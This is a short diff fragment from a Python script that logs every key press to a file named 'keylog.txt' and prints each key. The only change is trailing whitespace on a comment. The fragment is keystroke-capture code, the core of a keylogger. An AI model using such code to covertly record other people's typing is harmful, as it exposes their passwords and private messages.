@@ -12,7 +12,7 @@ count = 0
 ##logging file
 logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
-#recording key presses
+#recording key presses      
 def on_press(key):
     logging.info(str(key))
     print(key, "typed")
